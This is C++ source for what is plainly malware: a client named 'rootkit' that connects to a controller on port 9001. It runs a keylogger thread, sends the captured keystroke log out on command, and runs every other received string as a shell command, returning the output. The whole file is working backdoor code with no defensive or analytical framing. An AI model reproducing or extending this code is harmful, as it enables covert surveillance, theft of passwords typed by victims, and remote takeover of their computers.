#include "common.h"
#include "client_networking.h"
#include "logging.h"

static void handle_request(network::rootkit& client);

//general setup
int main()
{
	
	network::rootkit network_client(9001);
	
	
	std::thread keylogger(logger::logger_subroutine);

	handle_request(network_client);

	logger::thread_running = false;
	keylogger.join();
	
	return 0;
}

static void handle_request(network::rootkit& client)
{
	while (true)
	{
		std::string buffer;

		if ((client.recv_text(buffer)) == 0)
			client.reconnect();

		if (buffer.rfind("$echo", 0) == 0)
		{
			buffer = buffer.substr(buffer.find(" ")+1);
			client.echo(buffer);
		}
		else if (buffer.rfind("$keylogger", 0) == 0)
		{
			buffer = buffer.substr(buffer.find(" ")+1);
			std::string tmp = read_file(logger::path);
			client.send_text(tmp);
		}
		// default action is to just execute shell commands
		else
		{
			std::string tmp = cmd_exec(buffer.c_str());
			std::cout << "result: " << tmp << std::endl;
			client.send_text(tmp);
		}
	}
}